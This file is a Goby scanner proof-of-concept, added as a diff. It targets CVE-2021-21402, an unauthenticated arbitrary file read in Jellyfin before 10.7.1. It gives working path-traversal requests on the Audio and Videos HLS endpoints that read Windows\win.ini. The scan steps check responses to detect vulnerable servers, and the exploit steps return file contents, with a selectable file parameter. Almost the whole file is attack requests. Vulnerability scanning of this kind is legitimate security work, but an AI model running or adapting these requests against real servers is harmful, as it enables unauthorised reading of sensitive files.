@@ -1,0 +1,158 @@
+{
+      "Name": "Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402",
+      "Level": "2",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "(title='Jellyfin')",
+      "Description": "Jellyfin is a Free Software Media System. In Jellyfin before version 10.7.1, with certain endpoints, well crafted requests will allow arbitrary file read from a Jellyfin server's file system. This issue is more prevalent when Windows is used as the host OS. Servers that are exposed to the public Internet are potentially at risk. This is fixed in version 10.7.1. As a workaround, users may be able to restrict some access by enforcing strict security permissions on their filesystem, however, it is recommended to update as soon as possible.",
+      "Product": "Jellyfin",
+      "Homepage": "https://jellyfin.org/",
+      "Author": "PeiQi",
+      "Impact": "<p>Attackers can read arbitrary files to obtain sensitive information of the server<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "File",
+			"type": "select",
+			"value": "windows/win.ini",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "file",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "extension",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "extension",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "file",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/octet-stream"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-07 21:05:13",
+      "GobyVersion": "1.8.255"
+}
